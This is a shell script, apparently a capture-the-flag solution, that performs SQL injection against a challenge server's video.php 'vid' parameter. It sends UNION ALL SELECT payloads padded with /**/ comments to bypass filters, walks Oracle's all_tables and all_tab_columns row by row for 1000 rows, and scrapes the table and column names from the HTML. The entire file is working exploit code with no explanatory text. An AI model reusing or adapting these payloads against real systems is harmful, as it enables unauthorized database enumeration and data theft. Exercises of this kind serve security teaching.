#!/bin/sh

extract_column_name() (
    data="$(cat /dev/stdin)"
    table_name=$(printf "$data" | egrep 'h2' | sed 's/<\/*h2>//g')
    column_name=$(printf "$data" | egrep 'iframe' | sed 's/.*src="//g' | sed 's/".*$//g')
    echo $table_name --- $column_name
)

get_table_name() (
    idx=$1

    curl --insecure "https://edu-ctf.csie.org:10159/video.php?vid=-1\
/**/union/**/all/**/SELECT/**/NULL,table_name,NULL/**/FROM/**/\
(select/**/rownum/**/r,table_name/**/from/**/all_tables/**/order/**/by/**/table_name)where/**/r=$idx" 2>/dev/null |\
        grep '<h2>' | sed 's/<h2>//g' | sed 's/<\/h2>//g'
)

get_column_name() (
    idx=$1
    curl --insecure "https://edu-ctf.csie.org:10159/video.php?vid=-1\
/**/union/**/all/**/SELECT/**/NULL,table_name,column_name/**/FROM/**/\
(select/**/rownum/**/r,column_name,table_name/**/from/**/all_tab_columns/**/order/**/by/**/table_name)where/**/r=$idx" 2>/dev/null \
        | extract_column_name
)

for i in $(seq 1 1000); do
    get_column_name $i
done
